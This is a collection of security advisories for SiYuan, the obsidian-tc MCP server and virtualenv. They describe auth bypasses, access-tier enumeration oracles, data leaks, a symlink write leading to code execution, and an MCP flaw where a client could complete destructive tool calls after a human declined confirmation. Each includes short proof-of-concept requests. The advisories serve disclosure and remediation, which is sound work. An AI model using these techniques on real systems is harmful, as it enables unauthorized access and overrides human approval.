summary: SiYuan: Missing consistency check between packageName and repoURL/repoHash in bazaar package install allows overwriting an existing, trusted plugin
description:
## Summary

`installBazaarPlugin` (and the equivalent endpoints for widgets/icons/templates/themes) accept
`packageName`, `repoURL`, and `repoHash` as independent request fields with no validation that
they refer to the same package. `packageName` alone determines the install destination;
`repoURL`/`repoHash` alone determine what content gets downloaded and written there. A request
can name an already-installed, already-enabled plugin as `packageName` while pointing `repoURL`/
`repoHash` at different, attacker-influenced content, silently overwriting the existing plugin's
files.

## Affected code

`kernel/api/bazaar.go`:
```go
util.BindJsonArg("packageName", &packageName, true, true)
util.BindJsonArg("repoURL", &repoURL, true, true)
util.BindJsonArg("repoHash", &repoHash, true, true)
err := model.InstallBazaarPackage("plugins", repoURL, repoHash, packageName, 0)
```

`kernel/model/bazaar.go`:
```go
func getPackageInstallPath(pkgType, packageName string) (string, string, error) {
    case "plugins":
        return filepath.Join(util.DataDir, "plugins", packageName), "plugin.json", nil
```

`kernel/bazaar/install.go`:
```go
func installPackage(data []byte, installPath string) (err error) {
    ...
    if err = filelock.Copy(srcPath, installPath); err != nil { return }
    return
}
```

`installPath` is derived solely from `packageName`; the downloaded `data` is derived solely from
`repoURL`/`repoHash`; nothing cross-validates them, and `installPackage` performs no check for
whether `installPath` already contains an existing package before copying into it. The same
pattern applies to the widget/icon/template/theme install endpoints, which share
`getPackageInstallPath`.

This does not involve path traversal — `installPath` always resolves inside
`DataDir/plugins/` (or the corresponding directory for other package types), so this is not an
instance of "arbitrary file write outside the workspace path" (excluded by this project's
SECURITY.md). The issue is that the write lands in the *wrong, existing* location within the
intended directory, not outside it — an authorization/identity-verification gap, not a path
traversal.

## Reachability / why this is not trivially remote

The bazaar endpoints are gated by `model.CheckAuth`, `model.CheckAdminRole`, `model.CheckReadonly`.
When no lock-screen password is configured (the common desktop default), `CheckAuth` still
enforces a same-origin check:
```go
if !localhost || ... || ("" != origin && !util.IsLocalOrigin(origin)) || ... {
    // reject with 401
}
```
I verified `IsLocalOrigin`/`IsLocalHostname` correctly parse the `Origin` header via `url.Parse`
and check exact hostname / loopback IP:
```go
func IsLocalOrigin(origin string) bool {
    if u, err := url.Parse(origin); err == nil {
        return IsLocalHostname(u.Hostname())
    }
    return false
}
func IsLocalHostname(hostname string) bool {
    if "localhost" == hostname || strings.HasSuffix(hostname, ".localhost") {
        return true
    }
    if ip := net.ParseIP(hostname); nil != ip {
        return ip.IsLoopback()
    }
    return false
}
```
This was tested against common bypass patterns (subdomain-suffix tricks like
`localhost.attacker.com`, and `Origin: null` as sent by sandboxed iframes) and found no bypass —
this is a correctly-implemented check. This means a purely remote attacker (e.g. a malicious
website) cannot invoke this endpoint via CSRF; a request must originate from SiYuan's own
renderer origin.

## Realistic impact

Given SiYuan runs as an Electron app with `nodeIntegration: true` (per prior advisories in this
repository), a same-origin script-execution primitive (e.g. an XSS bug in the renderer, of which
several have been fixed in this repository recently) is typically already sufficient for direct
code execution. This bug's marginal value is **persistence**: a transient XSS-driven compromise
can use this endpoint to overwrite an existing, trusted, already-enabled plugin's `index.js`,
converting a one-time compromise into code that runs on every future launch of the application,
surviving after the original XSS vector is closed.

The overwrite does not effect immediately, via this specific
endpoint. `PushReloadPlugin` (the websocket event that triggers frontend hot-reload without
restart) is only called from the batch-update path (`InstallBazaarPackages`, used by
`batchUpdatePackage`), which explicitly checks `if petal != nil && petal.Enabled` before forcing
a reload via `SetPetalEnabled`. The single-package install endpoint (`installBazaarPlugin`) does
not call `PushReloadPlugin` at all — it only pushes a generic success toast. So an overwrite via
this endpoint activates on the next app restart or manual plugin toggle, rather than instantly 
still a realistic and frequent event for a desktop application, but not an instant hot-reload.

## Suggested fix

Verify that `packageName` matches the package name declared in the downloaded package's own
`plugin.json`/`theme.json`/etc. before copying into `installPath`, and/or refuse to install over
an existing, non-empty destination directory unless the request is explicitly an update of that
same package (matching by source repo identity, not just by request-supplied name).

## Verification notes

Confirmed via static source review of `kernel/api/bazaar.go`, `kernel/model/bazaar.go`,
`kernel/bazaar/install.go`, `kernel/model/session.go` (CheckAuth), `kernel/util/net.go`
(IsLocalOrigin/IsLocalHostname), and `kernel/model/push_reload.go` /
`app/src/plugin/loader.ts` (reload trigger wiring). I do not have a running SiYuan instance
in this environment to execute an end-to-end proof of concept; findings are based on tracing
the actual, unmodified control flow across these files rather than assumption.

cwes.name: Exposure of Resource to Wrong Sphere

summary: SiYuan: A parser differential between the WebSocket keepalive exemption and the session quarantine allows unauthenticated access to the broadcast event stream
description:
### Summary

Two checks on the same WebSocket request URI parse it differently. The authentication exemption for keepalive sessions matches raw substrings, while the quarantine introduced to contain those sessions reads a parsed query parameter. Because Go's `url.Values.Get` returns only the first value for a repeated key, a single URI can satisfy the exemption and still resolve to a non-auth session identity.

The result is that an unauthenticated remote caller connects to the kernel WebSocket with a valid access auth code configured, is placed in the general broadcast pool rather than the quarantined pool, and receives the live event stream.

### Details

**The exemption matches substrings.** `kernel/server/serve.go:1222` on the development branch, `:1074` on master:

```go
authOk = strings.Contains(s.Request.RequestURI, "/ws?app=siyuan") &&
         strings.Contains(s.Request.RequestURI, "&id=auth&type=auth")
```

Neither operand is parsed. Any URI containing both literals is exempted, regardless of what the query actually resolves to.

**The quarantine parses.** Commit `1e370e373` added the containment for exempted sessions at `kernel/util/websocket.go:171`:

```go
id = session.Request.URL.Query().Get("id")
return "auth" == id
```

`url.Values.Get` returns the first value for a repeated key.

**The differential.** For the URI:

```
/ws?app=siyuan&id=main&type=main&id=auth&type=auth
```

- It contains `/ws?app=siyuan` and `&id=auth&type=auth`, so `authOk` is true. No cookie, no JWT and no access auth code are required.
- `Query().Get("id")` returns `main`, so `IsAuthSession` is false. `AddPushChan` files the session in `sessions`, the broadcast pool, rather than in `authSessions`.
- `Query().Get("type")` returns `main`, so the session matches `BroadcastByType("main", ...)`.
- Without a valid `X-Auth-Token` the publish flag is never set, so `isPublishSession()` does not exclude it either.

Every guard that should have caught the session keys off a different parse than the one that admitted it.

**No origin validation.** `CheckOrigin` does not appear on the `/ws` path, so the cross-origin vector described in the parent advisory also remains available.

**Distinction from the existing broadcast-pool advisory.** GHSA-mw8r-mw84-88v2 concerns the publish port, where an anonymous session is expected to connect and the defect is that broadcast content is not gated for it afterwards. This report concerns the kernel port with an access auth code configured, where the session should never be admitted in the first place. The leaked data overlaps because both end in the same broadcast pool, but the mechanisms and the affected deployments are different, and gating publish sessions does not close this path.

### Proof of Concept

Kernel port, `--accessAuthCode` set. Three WebSocket connections, none carrying credentials of any kind.

| Socket | Query | Result |
|---|---|---|
| A, baseline | `?app=siyuan&id=main&type=main` | Rejected, closed 1002, 0 frames |
| B, control | `?app=siyuan&id=auth&type=auth` | Connects, 0 frames |
| C, attack | `?app=siyuan&id=main&type=main&id=auth&type=auth` | Connects, 19 to 30 frames across two runs |

Socket A establishes that the access auth code is enforced. Socket B establishes that the existing quarantine works exactly as intended, admitting the keepalive session but delivering nothing to it. Socket C differs from B only in the duplicated parameters, and receives the event stream.

Frames observed on socket C included `savedoc` (`"action":"create","data":{"Root":{"ID": ...`), `transactions` (`"action":"updateAttrs"` carrying document titles), `filetreeSortChanged` (the notebook's complete ordered `childIDs`), `create` (a notebook object including its `name`), and `backgroundtask`.

A canary string placed inside a document body did not appear in any frame, on a full-text search of all captured frames.

### Impact

An unauthenticated remote caller obtains the kernel's live event stream on a deployment protected by an access auth code, with no user interaction and no prior knowledge of the instance.

Precisely what is disclosed: document identifiers and titles, notebook identifiers and names, file paths, the complete ordered child structure of notebooks, and the full stream of create, update and delete operations as they occur. Document body content is not present in the observed frames.

That set corresponds to the disclosure claimed by GHSA-xp2m-98x8-rpj6, which means the remediation for that advisory is bypassable rather than incomplete in scope. The absence of origin validation on the endpoint additionally preserves the cross-origin reachability described there.

Confidentiality only. No frames observed permitted writes.

### Suggested fix

Make both checks agree, and stop re-parsing attacker-controlled input after admission.

1. In the exemption, parse the query rather than matching substrings, and require `id` and `type` each to equal `auth` exactly.
2. Reject requests carrying duplicated query keys on this endpoint, so no URI can present two identities.
3. Record the exemption as a flag on the session at connect time, and have `IsAuthSession` read that flag rather than re-parsing the request. A session admitted under the keepalive exemption is then quarantined by construction, independent of how its URI is read later.

Adding origin validation to `/ws` would additionally close the cross-origin vector.

summary: SiYuan: authFilePublishAccess distinguishes hidden and forbidden documents from public and nonexistent ones, and issues a publish-auth cookie for documents it reports as forbidden
description:
### Summary

`/api/filetree/authFilePublishAccess` is registered with `CheckAuth` only and is reachable anonymously. It never sets a failure code, so its outcome is signalled entirely by the response message and by whether a `Set-Cookie` header is present. Those two signals differ across access tiers, which lets an anonymous caller determine, for any candidate document identifier, whether that document is public or nonexistent, password-protected, or exists at the hidden or forbidden tier.

Separately, hidden and forbidden entries carry an empty password. Submitting `password:""` therefore satisfies the equality check for them, and the server responds by issuing `Set-Cookie: publish-auth-<docID>` for a document whose own tier is forbidden.

### Details

**Route,** identical on both refs:

```go
ginServer.Handle("POST", "/api/filetree/authFilePublishAccess", model.CheckAuth, authFilePublishAccess)
```

No `CheckAdminRole`, no `CheckReadonly`.

**Handler,** `kernel/api/filetree.go:1608` on the development branch and `:1421` on master. `ret.Code` is never assigned on the failure path, so every response carries `code:0`. The branch is:

```go
if item.Password == password {
    // SetPublishAuthCookie
} else {
    ret.Msg = Conf.Language(285)
}
```

**The cookie is issued for forbidden documents.** Entries at the hidden and forbidden tiers store `Password == ""`. A request with `password:""` therefore makes `item.Password == password` true for them, and the handler takes the success branch. The server issues a publish-auth cookie for a document it otherwise treats as inaccessible.

The cookie itself confers nothing, because those tiers are decided before any password check elsewhere in the codebase. The defect is that the endpoint's success signal does not correspond to access being granted, and that signal is observable.

**Three distinguishable outcomes.** With `password:""`, one request per candidate identifier:

| Tier of the target | `Set-Cookie` | Body |
|---|---|---|
| Public (no publish-access entry) | absent | `{"code":0,"msg":""}` |
| Nonexistent identifier | absent | `{"code":0,"msg":""}` |
| Password-protected | absent | `{"code":0,"msg":"Password is incorrect"}` |
| Hidden | **present** | `{"code":0,"msg":""}` |
| Forbidden | **present** | `{"code":0,"msg":""}` |

Public and nonexistent are indistinguishable from each other, which is correct. Everything else separates. A caller learns whether a given identifier names a password-protected document, or a document that exists at the hidden or forbidden tier, which is precisely the class the publish tiers exist to conceal.

**Identifiers are readily available.** Document and block identifiers appear in the DOM of published pages, in reference and backlink payloads, and in annotation reference data. The caller does not need to guess them.

**A fourth response on the development branch.** `IsEncryptedPublishRuntimeTarget` sets `ret.Code = -1`, which identifies the supplied identifier as belonging to an encrypted notebook. That is a membership oracle for encrypted notebooks, the same data class as `GHSA-f2rw-w22v-54vh`.

### Proof of Concept

Publish mode enabled, `Publish.Auth.Enable` false, anonymous client. One request per candidate identifier, all with an empty password:

```
POST /api/filetree/authFilePublishAccess
{"id":"<candidate document id>","password":""}
```

Comparing the response message and the presence of `Set-Cookie` against the table above classifies the identifier. Documents at the hidden and forbidden tiers return a publish-auth cookie and an empty message, distinguishing them both from public documents and from identifiers that name nothing at all.

### Impact

An anonymous reader in publish mode, or any publish `RoleReader`, can classify arbitrary document identifiers by access tier and confirm the existence of documents at the hidden and forbidden tiers. On the development branch the same endpoint additionally reveals whether an identifier belongs to an encrypted notebook.

Scoped precisely: no document content is disclosed and no privilege is gained, since the issued cookie is inert for these tiers. The value is as a confirmation primitive, turning an identifier obtained elsewhere into a definite statement about a document the reader is not permitted to see.

Confidentiality only, with no integrity or availability impact.

### Suggested fix

Return an identical response for every failure and for every tier the caller may not access, with no `Set-Cookie` header and no distinguishing message. In particular, do not treat an empty stored password as a successful match: hidden and forbidden entries should short-circuit before the password comparison rather than satisfying it. The encrypted-notebook branch should return the same generic response as everything else rather than its own code.

A rate limit on this endpoint would be a reasonable additional hardening measure, though it does not address the disclosure above.

summary: SiYuan: The publish filter for database backlinks consults the forbidden list instead of the visibility list, disclosing hidden-tier documents to anonymous readers
description:
### Summary

`/api/av/getAttributeViewBacklinks` filters its results for reader roles through `FilterAttributeViewBacklinksByPublishAccess`. That function resolves its ignore list with `GetDisablePublishAccess`, which covers only the forbidden tier. Documents at the hidden tier are absent from that list, so they pass the check.

The result is that an anonymous reader supplying a publicly visible database row receives the database name, row title and document path of rows in hidden documents that reference it.

The rest of the function is correct. It takes `*gin.Context` and calls `GetPathPasswordByPublishAccess` and `CheckPublishAuthCookie` at all four decision points, so the password-protected and private tiers are properly enforced. The defect is the choice of list, on one line.

### Details

**Route,** `kernel/api/router.go:545` on the development branch and `:527` on master:

```go
ginServer.Handle("POST", "/api/av/getAttributeViewBacklinks", model.CheckAuth, getAttributeViewBacklinks)
```

`CheckAuth` only. No `CheckAdminRole`, no `CheckReadonly`.

**The defect.** In `FilterAttributeViewBacklinksByPublishAccess` (`kernel/model/publish_access.go:1060` on dev, `:435` on master):

```go
publishIgnore := GetDisablePublishAccess(publishAccess)
```

`GetDisablePublishAccess` returns only entries at the forbidden tier. A hidden document has `visible:false`, `password:""`, `disable:false`, so it does not appear in that list. `CheckPathAccessableByPublishIgnore` therefore returns true for it, and because the password is empty the authentication branch short-circuits. Hidden documents pass both halves of the check.

**The sibling filter uses the correct list.** The regular backlink panel is the same product feature in the same UI, and it is gated properly. `kernel/api/ref.go:170` `getBacklink2` calls `FilterPathsByPublishAccess`, which at `kernel/model/publish_access.go:1256` resolves its list with `GetInvisiblePublishAccess`. Two backlink filters in the same file, opposite list choices.

**The distinction the tiers are meant to draw.** The shipped description of the hidden tier, from `app/appearance/langs/en.json`:

```
publishAccessHiddenComment = "Not publicly visible, can be accessed directly."
```

A direct-access endpoint using the forbidden list is consistent with that: hidden documents are meant to be reachable when the caller already knows the identifier. Backlink discovery is not direct access. The caller supplies the target row and receives the identities of referring rows it never named, which is enumeration, and enumeration is precisely what "not publicly visible" excludes.

**Origin.** The filter was introduced by `6da2c736e` (2026-07-18, "Show database relation backlinks in the attribute panel", #10599) with this list choice from the start. No security-focused commit has touched the attribute-view backlink path since.

**What is returned.** Per matched backlink: `AvName` (the database name), `Title` (the row title), `DatabasePath` (the HPath of the containing document), `BoxID`, `DatabaseBlockID`, and `Relations[].KeyName`. These are author-written names and titles, not opaque identifiers.

### Proof of Concept

Publish mode enabled, `Publish.Auth.Enable` false, anonymous client with no credentials or cookies. Document A is public and holds a database with a row. Document B is set to varying tiers and holds a database whose relation field points at A's row. The attacker needs only A's `avID` and `itemID`, both present in the DOM of A's own published page.

Listing control first, establishing that the platform agrees B must not be listed:

```
POST /api/filetree/listDocsByPath
→ returns only the public document
```

Then the same backlinks request at four tier settings, spaced to clear the 30-second `GetPublishAccess()` cache:

| Tier of document B | Result |
|---|---|
| Hidden (`visible:false`, no password, `disable:false`) | `total:1`, with `avName`, `title`, `databasePath` and `relations[].keyName` for the row in B |
| Forbidden (`disable:true`) | `total:0` |
| Private (password set) | `total:0` |
| Hidden again (restored) | `total:1`, reproducible |

The forbidden row confirms that the disable list is what the filter consults. The private row confirms that the password half works correctly. The gap is the hidden tier alone.

```
POST /api/av/getAttributeViewBacklinks
{"avID":"<public database id>","itemID":"<public row id>"}

→ 200, total:1, disclosing the database name, row title and document path
       of a document the same session cannot list
```

### Impact

An anonymous reader in publish mode, or any publish `RoleReader`, discovers that a hidden document contains a database row referencing a public one, and receives that row's title, its database's name, and the containing document's path. Names and titles are author-written and routinely describe their subject, so this discloses both the existence and the topic of documents the author marked as not publicly visible.

The reader does not need to know anything about the hidden document beforehand. The only input is a public row identifier taken from a page they are already entitled to view.

Confidentiality only, with no integrity or availability impact. No document body content is returned.

### Suggested fix

Change the list resolution in `FilterAttributeViewBacklinksByPublishAccess` to `GetInvisiblePublishAccess`, mirroring `FilterPathsByPublishAccess` on the regular backlink path. The password handling in the function is already correct and needs no change.

summary: SiYuan: The publish filter for local storage returns the administrator's entire storage map with only three keys sanitized
description:
### Relationship to GHSA-hgfg-j9pg-43xw

That advisory concerned the administrator's live UI layout, and commit `63c7d5474` resolved it by removing `FilterUILayoutByPublishIgnore` and nulling `Conf.UILayout` for readers. That fix is correct and complete for the live layout.

This report concerns a different endpoint, a different filter function and a different storage backing. `/api/storage/getLocalStorage` reads `data/storage/local.json` rather than `Conf.UILayout`, and its filter `FilterLocalStorageByPublishAccess` was not touched by that commit. The consequence is that the same serialized tab objects the earlier fix withheld continue to be served, from the closed-tab history rather than the live layout.

### Summary

Three routes, `/api/storage/getLocalStorage`, `getLocalStorageVal` and `getLocalStorageVals`, are registered with `CheckAuth` only and are reachable by the publish `RoleReader` token and anonymously when `Publish.Auth.Enable` is `false`. All three call `model.GetLocalStorage()` and then, for read-only roles, `FilterLocalStorageByPublishAccess`.

That filter begins by assigning the administrator's entire storage map to its return value and then removes three specific fields. Everything else in the map is returned unmodified. A single unauthenticated POST with an empty body returns the administrator's recently closed tabs with their document titles and identifiers, their current search keywords and the paths those searches cover, the expanded private paths in their file tree, and per-document identifiers from several other keys.

### Details

**Routes.** `kernel/api/router.go:87-89` on master, the same block on the development branch:

```go
ginServer.Handle("POST", "/api/storage/getLocalStorage",     model.CheckAuth, getLocalStorage)
ginServer.Handle("POST", "/api/storage/getLocalStorageVal",  model.CheckAuth, getLocalStorageVal)
ginServer.Handle("POST", "/api/storage/getLocalStorageVals", model.CheckAuth, getLocalStorageVals)
```

No `CheckAdminRole`, no `CheckReadonly`.

**The filter is an allowlist inverted into a blocklist.** `kernel/model/publish_access.go:911` on master and `:1481` on the development branch, byte-identical on both:

```go
func FilterLocalStorageByPublishAccess(publishAccess PublishAccess, localStorage map[string]any) (ret map[string]any) {
    ret = localStorage            // the entire administrator map
    publishIgnore := GetInvisiblePublishAccess(publishAccess)
    // clears local-searchkeys["keys"]
    // clears local-searchasset["k"] and ["keys"]
    // blanks local-docinfo["id"], only when bt != nil, visible tier only, no password check
    return
}
```

`local.json` holds roughly thirty keys. Three are sanitized. The rest are returned as stored.

**What survives.** Taking the client's own list of keys it round-trips through this endpoint (`app/src/protyle/util/compatibility.ts:563`), the notable survivors are:

- `local-closed-tabs`. Up to `SIZE_UNDO` entries, each produced by `layoutToJSON(item, tabJSON)` at `app/src/layout/Wnd.ts:779`. This is the same serializer that produced the data in the earlier advisory: tab title, `docIcon`, `rootId`, `notebookId`, `blockId`, `mode`, `action`, and for a Search tab the entire config object. Unfiltered.
- `local-searchdata`. The live document-search configuration, including `k` (the search text), `r` (replace text), `hPath`, `idPath` (the paths the search was scoped to) and `types`. Note the filter clears the search *history* array and the *asset*-search keyword, but leaves the document-search keyword itself. The project's own standard is applied to two of the three related fields.
- `local-filespaths`. `IFilesPath[]` of `{notebookId, openPaths[]}`, the expanded private notebook and folder paths in the file-tree dock.
- `local-fileposition`, `local-outline`, `local-zoom`. Keyed by document or block identifier, so each discloses private document identifiers.
- `local-move-path`. `{keys[], k}`, the move-document dialog's path history and last keyword.
- `local-recent-docs`, `local-history`, `local-flashcard`, `local-dailynoteid`, `local-layouts`.

**The asymmetry is visible in the function signature.** In the same file, `kernel/api/storage.go`:

| Handler | Filter | Receives `*gin.Context` |
|---|---|---|
| `getCriteria` | `FilterCriteriaByPublishAccess(c, ...)` | yes |
| `getRecentDocs` | `FilterRecentDocsByPublishAccess(c, ...)` | yes |
| `getLocalStorage` / `Val` / `Vals` | `FilterLocalStorageByPublishAccess(publishAccess, data)` | no |

The two sibling filters take the request context and can therefore call `CheckPublishAuthCookie` to evaluate the password tier. `FilterLocalStorageByPublishAccess` does not receive the context, so it cannot perform that check at all. The visible-only limitation is fixed in the parameter list rather than in the body.

Separately, `local-recent-docs` passes through this endpoint unfiltered, which bypasses the dedicated `FilterRecentDocsByPublishAccess` that guards the same data on `getRecentDocs`.

**Note on a prior assessment.** `getLocalStorage` appears on lists of endpoints considered correctly filtered, on the basis that it calls a `Filter*ByPublishAccess` function. That observation is accurate and this report does not contradict it. The filter is called. What it does is assign the whole map and remove three fields.

**No persistence side effect.** The in-place mutations the filter performs do not corrupt the administrator's stored state, because `GetLocalStorage` re-reads and unmarshals `storage/local.json` on each call (`kernel/model/storage.go:82`), so the map is per-request. This is noted to pre-empt the concern rather than as part of the finding.

### Proof of Concept

Precondition: publish mode enabled (default port 6808), anonymous when `Publish.Auth.Enable` is `false`, otherwise any publish reader account. An administrator who has used the client normally, closing some document tabs and running a search.

```
POST http://127.0.0.1:6808/api/storage/getLocalStorage
{}

→ 200. The returned map includes, among others:
     local-closed-tabs   entries carrying title, docIcon, rootId, notebookId,
                         blockId for recently closed documents, including
                         documents the reader has no publish access to
     local-searchdata    k, r, hPath, idPath for the administrator's current
                         document search
     local-filespaths    notebookId and openPaths for expanded private folders
     local-fileposition  keys are private document identifiers
```

`getLocalStorageVal` returns any single key by name, so a caller who only wants the closed-tab history can request it directly.

For contrast, requesting the same underlying data through the sibling endpoint shows the filtering that is applied elsewhere:

```
POST http://127.0.0.1:6808/api/storage/getRecentDocs
{}

→ 200, filtered by FilterRecentDocsByPublishAccess
```

while `local-recent-docs` inside the storage response is not.

### Impact

An anonymous reader in publish mode, or any publish `RoleReader`, obtains the administrator's working context: the titles and identifiers of documents they recently had open, what they have been searching for and where, which private folders they have expanded, and per-document identifiers across several other keys. Titles and search keywords are author-written text and routinely describe the subject of the documents they refer to.

The document and notebook identifiers disclosed here are also the input required by identifier-to-path and path-to-content resolution, so the value is not limited to the metadata itself.

No document bodies are returned, and nothing is written. Confidentiality only.

### Suggested fix

Invert the filter into an actual allowlist. Return only the keys a publish reader needs to render published content, which is a short list along the lines of `local-images`, `local-emojis`, `local-pdftheme`, `local-fontstyles` and the theme and zoom preferences, and drop everything else by default. New keys added in future then default to withheld rather than exposed.

Additionally, pass `*gin.Context` into `FilterLocalStorageByPublishAccess` so that any retained per-document entry can be gated with the full `CheckBlockIdAccessableByPublishAccess` including the password tier, matching the sibling filters in the same file.

summary: obsidian-tc HTTP transport lacks Origin/DNS-rebinding protection, enabling drive-by vault access on loopback
description:
### Impact
The Streamable HTTP transport was constructed without `enableDnsRebindingProtection`/`allowedHosts`/`allowedOrigins` and performed no `Origin`-header validation. With the documented `auth.mode: "none"` loopback default, a **drive-by web page could `POST http://127.0.0.1/mcp`** and receive caller `http-local` with scopes `["*"]` — full vault read/write — via DNS rebinding / a forged Origin.

### Patches
Fixed in **1.3.1**. Upgrade to `>= 1.3.1`. The transport now enables DNS-rebinding protection and allowed hosts/origins and returns HTTP 403 on an invalid Origin (per MCP 2025-11-25).

### Workarounds
Do not expose the HTTP transport with `auth.mode: "none"`; require JWT auth, or bind to a non-loopback interface behind a proxy that validates `Origin`.

summary: obsidian-tc Bridge tools leak denied-note data via unfiltered sibling fields
description:
### Impact
Bridge tool results filtered only the `items` array against the read ACL and passed sibling fields through unfiltered: `tasks_filter` emitted `groups` whose counts reflected denied notes, `makemd_query` returned `...result` siblings, and `list_templates` enumerated Templater template paths and parsed user-function bodies with no read-whitelist gate. A caller could infer or read data from notes outside its read ACL.

### Patches
Fixed in **1.3.1**. Upgrade to `>= 1.3.1`. All path-attributable fields are now scrubbed or fail-closed, and `list_templates` is gated on the read whitelist.

### Workarounds
Disable the affected bridge tools (`tasks_filter`, `makemd_query`, `list_templates`) via tool visibility.

summary: obsidian-tc: Declined human-in-the-loop confirmations can permit destructive calls over HTTP
description:
### Summary
On a Streamable HTTP deployment with `auth.jwtSecret` configured, serving a 2026-07-28-era client that declared `elicitation.form` support, a call to a dispatch-gated tool (`destructive: true`, or a scope with an HITL floor) that was offered an `inputRequired` confirmation could still complete after the human declined, cancelled, or the elicitation response was omitted or malformed, provided the client echoed the validly bound `requestState` on resubmission. The server trusted an authentic, call-bound state as proof of approval; the state is minted before the elicitation leg is asked, so it proves only that the resubmission belongs to the same call.

### Details
Reproduced directly: a `destructive: true` tool call, offered `inputRequired`, answered with `{action: "decline"}` on the `elicitation/create` leg, still wrote. Present since the 2026-07-28 round trip shipped in v1.13.0 (THE-583). Only dispatch-gated tools were reachable; the sixteen handler-side conditionally gated tools (`write_note` overwrite, `move_note`, and others) did not read the elicitation state on the modern wire at all, so they neither let a decline nor an approval through.

### Impact
A client that echoes state after a decline can execute destructive vault operations (delete, cross-folder move, frontmatter replace, link rewrite) that the human explicitly refused. The precondition is a compliant client behaving incorrectly or a client under an attacker's control; the human's refusal is not enforced by the server.

### Patches
Fixed in 1.31.4: the server now also requires the confirm leg's own response (`inputResponse`) to be `{action: "accept", content: {approve: true}}` before trusting the echoed state. A declined, cancelled or not-approved round renders the ordinary `elicit_required` error and is never offered a second round for the same declined confirmation. The same release adds server-initiated in-band confirmation on stdio (legacy era), so stdio agents no longer need to mint `elicit_token` themselves.

### Not addressed
A malicious or non-compliant client can still answer its own `elicitation/create` leg with an approval regardless of what the human said. The server cannot verify that the client rendered the form or that a human saw it; this is inherent to the client-driven half of the 2026-07-28 protocol. The legacy shim, where the server sends and owns the leg, does not share this gap.

### Workarounds
Run affected deployments over stdio, or leave `auth.jwtSecret` unset so the `requestState` codec (and therefore `inputRequired`) is never offered; both fall back to the CLI `elicit_token` path.

### Credit
Reported in GH #967; found and closed under THE-1106 (PR #969); the residual is documented in SECURITY.md.

### References
- PR #969, GH #967, CHANGELOG `## [1.31.4] ### Security`
- `packages/server/src/mcp/server.ts` (`tools/call` handler), `packages/server/src/vault/hitl.ts`

summary: obsidian-tc tokens can access arbitrary configured vaults
description:
### Impact
Tool dispatch did not check the caller-supplied `input.vault` against the caller's bound vault (`ctx.vaultId`); the folder ACL was a single global instance and the JWT carried no vault claim. As a result, **any valid token could read, write, or delete any configured vault** by passing `input.vault`, defeating multi-tenant isolation across ~90 tool sites. (`resources/read` was the only surface that already guarded this.)

### Patches
Fixed in **1.3.1** (the fix was developed on the `v1.3.0` tag, which never published to npm; 1.3.1 is the first published release with the fix). Upgrade to `>= 1.3.1`.

### Workarounds
Run a single vault per server process, or isolate each tenant on a separate process/credential.

### Fix
A central `input.vault === ctx.vaultId` guard was added in dispatch before the scope check.

summary: obsidian-tc: Default folder ACL is fail-open; .obsidian plugin secrets are readable by default
description:
### Impact
With a default configuration, an undefined `readPaths`/`writePaths` meant allow-all, the `strictReadDefault` flag was inert, and the `.obsidian`/`.git`/`.trash` control directories were denied only during enumeration — not on the direct request path. A caller could read `.obsidian/plugins/*/data.json`, exfiltrating **plugin API keys and Obsidian Sync passwords** (live-reproduced), as well as any other in-vault file by path.

### Patches
Fixed in **1.3.1**. Upgrade to `>= 1.3.1`. The default now denies `.obsidian`/`.git`/`.trash` on read/write/delete and honors `strictReadDefault` on the request path.

### Workarounds
Set an explicit `readPaths`/`writePaths` whitelist that excludes the control directories.

cwes.name: Exposure of Sensitive Information to an Unauthorized Actor

summary: obsidian-tc : Symlink read-ACL scope bypass via lexical path checks
description:
### Impact
ACL checks ran on the lexical vault-relative path while containment used the realpath. An in-vault symlink placed under an allowed glob, whose realpath resolved into a denied folder, passed the read ACL — an intra-vault read-ACL-scope bypass. It requires an out-of-band-planted symlink (no MCP tool creates one) and is not a vault-root escape.

### Patches
Fixed in **1.3.1**. Upgrade to `>= 1.3.1`. ACL enforcement now derives the realpath vault-relative path and feeds a single unified predicate at every site.

### Workarounds
Do not permit untrusted symlinks inside the vault.

summary: virtualenv: Generated files can follow existing destination links
description:
## Summary

Generated activation files and pyvenv.cfg can follow existing links and write outside the requested environment. The
template writer tests exists() before unlinking, which misses dangling symlinks; the configuration writer opens the
existing path directly.

Anthropic's OSS Scanner reported this as `ANT-2026-XBEOCBS1` in `virtualenv-20261015-005`, received on 15 October 2026.

## Affected area

Final file entries written during environment creation and seeding.

## Attacker-controlled input

Another account must be able to prepare file links in the destination before creation. The invoking user must have write
permission at the linked target. The destination parent must remain controlled during creation; concurrent
parent-directory replacement is a separate concern.

## Affected code

The relevant 21.14.8 source is in
[template writer](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/activation/via_template.py),
[configuration writer](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/create/pyenv_cfg.py).

## Mechanism

`ViaTemplateActivator._generate()` removes an existing output only when `Path.exists()` is true. A dangling symlink
therefore survives, and `write_bytes()` creates its target outside the environment. Other generated files have related
final-entry behavior. `PyEnvCfg.write()` opens `pyvenv.cfg` without first replacing an existing link; a symlink or hard
link there can overwrite an existing target. These paths require a prepared destination tree and the invoking user's
permission to write the linked target.

## Reproduction and evidence

The scanner's project tree contains `venv/bin/activate -> ../../../.bash_aliases` and an executable `venv/bin/basename`.
Before creation, a new interactive bash does not create the marker. A plain `virtualenv venv` writes the activation
script through the dangling link, creating `~/.bash_aliases` as a regular file. Debian's stock `.bashrc` sources that
file; the next interactive bash adds `venv/bin` to `PATH` and the planted `basename` writes the marker. The reproducer
checks that the link remains, `~/.bash_aliases` appears, and the second shell executes the planted file. A separate
manual check links `pyvenv.cfg` to `~/.bashrc` and observes the latter replaced with generated configuration text.

The link lets creation write outside the requested environment. The attacker chooses the target path but the generated
bytes come from virtualenv. The executable in the example was already in the prepared tree; this finding is not
arbitrary code injection into an otherwise trusted destination. The scanner traces the template behavior to #1454, first
released in 20.0.0b1. [PR #3431](https://github.com/pypa/virtualenv/pull/3431) replaces pre-existing output links and
uses exclusive creation for generated text. It does not make a destination safe if another account can replace parent
directories during creation.

## Attack sequence

```mermaid
sequenceDiagram
    participant A as Prepared project tree
    participant V as virtualenv writer
    participant H as User home
    participant B as Next interactive bash
    A->>V: venv/bin/activate links to missing ~/.bash_aliases
    V->>V: Path.exists() follows link and returns false
    V->>H: write activation bytes through link
    H-->>B: ~/.bash_aliases now exists
    B->>H: .bashrc sources ~/.bash_aliases
    B->>A: PATH reaches planted venv/bin/basename
    A-->>B: marker created
    Note over V,H: pyvenv.cfg can also overwrite an existing linked target
```

